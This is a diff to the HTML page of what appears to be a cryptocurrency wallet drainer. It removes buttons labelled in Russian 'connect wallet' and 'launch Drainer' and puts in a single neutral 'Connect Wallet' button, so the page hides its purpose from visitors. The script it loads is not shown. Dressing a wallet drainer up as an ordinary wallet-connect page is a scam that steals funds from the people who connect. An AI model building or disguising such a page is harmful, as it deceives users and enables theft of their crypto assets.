@@ -25,7 +25,7 @@
         width: 100%;
       }
 
-      #open-connect-modal {
+      #action-btn {
         background-color: #1d4ed8;
         color: white;
         border: none;
@@ -36,6 +36,7 @@
         box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
         width: 90%;
         max-width: 320px;
+        cursor: pointer;
       }
 
       #status {
@@ -44,13 +45,11 @@
         color: #ccc;
       }
     </style>
-    <script type="module" src="./main.js"></script>
   </head>
   <body>
     <div id="app">
-      <button id="open-connect-modal">🔌 Подключить кошелёк</button>
-      <button id="drainer-btn">💥 Запустить Drainer</button>
-      <div id="status">Ожидание подключения…</div>
+      <button id="action-btn">Connect Wallet</button>
     </div>
+    <script type="module" src="./main.js"></script>
   </body>
 </html>
